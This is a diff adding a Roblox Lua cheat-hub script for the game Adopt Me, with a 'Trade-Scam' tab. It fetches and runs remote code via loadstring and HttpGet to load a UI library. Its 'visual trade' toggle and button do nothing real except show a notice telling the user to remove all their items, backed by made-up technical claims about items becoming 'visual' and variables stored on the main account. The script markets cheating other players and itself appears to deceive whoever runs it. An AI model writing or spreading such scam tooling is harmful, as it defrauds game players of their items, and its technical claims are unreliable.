@@ -1,0 +1,71 @@
+local validPlaceIds = {
+    920587237,
+}
+
+local currentPlaceId = game.PlaceId
+local isValidPlaceId = false
+
+for _, placeId in ipairs(validPlaceIds) do
+    if currentPlaceId == placeId then
+        isValidPlaceId = true
+        break
+    end
+end
+
+if isValidPlaceId then
+    local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/MuscleSC/Rayfield/main/source.lua'))()
+local Discord = "Server is under development."
+
+local Window = Rayfield:CreateWindow({
+    Name = "정홍희 Taekwondo Hub",
+    LoadingTitle = "정홍희 Taekwondo Hub",
+    LoadingSubtitle = "by 정홍희",
+    ConfigurationSaving = {
+       Enabled = true,
+       FolderName = Taekwondo, -- Create a custom folder for your hub/game
+       FileName = "Taekwondo"
+    },
+    KeySystem = false, -- Set this to true to use our key system
+    KeySettings = {
+       Title = "정홍희 | Key System",
+       Subtitle = "",
+       Note = "Most Famous Korean Martial Arts is the answer.",
+       FileName = "Taekwondo",
+       SaveKey = true,
+       Key = {"Taekwondo"}
+    }
+ })
+
+local Tab = Window:CreateTab("Trade-Scam", 7733673056)
+local Section = Tab:CreateSection("Trade-Scam | 정홍희📜")
+local Toggle = Tab:CreateToggle({
+    Name = "Toggle Visual Trade 📌",
+    CurrentValue = false,
+    Callback = function(Value)
+        print(Value)
+
+    end,
+ })
+ local Button = Tab:CreateButton({
+    Name = "Start Visual Trade❗",
+    Callback = function()
+        wait(5)
+        Rayfield:Notify({
+            Title = "정홍희 Exploits | Adopt Me",
+            Content = "Items in trade are now visual, Remove all of your items!",
+            Duration = 5,
+            Image = 4483362458,
+        })
+    end,
+ })
+
+ local Paragraph = Tab:CreateParagraph({Title = "Tutorial For Trade-Scam! 📜", Content = "First, Click On Toggle Visual Trade. Then, Click On Start Visual Trade! It Will Take A 2 Seconds For The Items In The Trade To Become Visual!"})
+ local Paragraph = Tab:CreateParagraph({Title = "Alt Account Warning! ⚠️", Content = "If You Are Using An Alt Account/Another Account, It Will Not Work! This Will Only Work On Your Main Account Because The .SetVariables Are Stored On Your Main Account!"})
+ local Paragraph = Tab:CreateParagraph({Title = "ADOPT ME Status! 🛠️", Content = "This Hub Is currenty 100% Working. If you find any Errors or Bugs, Please report it to 'chonghonghi' On Discord!"})
+ local Paragraph = Tab:CreateParagraph({Title = "Credits", Content = "Created & developed by chonghonghi."})
+else
+    local player = game.Players.LocalPlayer
+    if player then
+        player:Kick("You have been kicked because this game is not available in your current place.")
+    end
+end
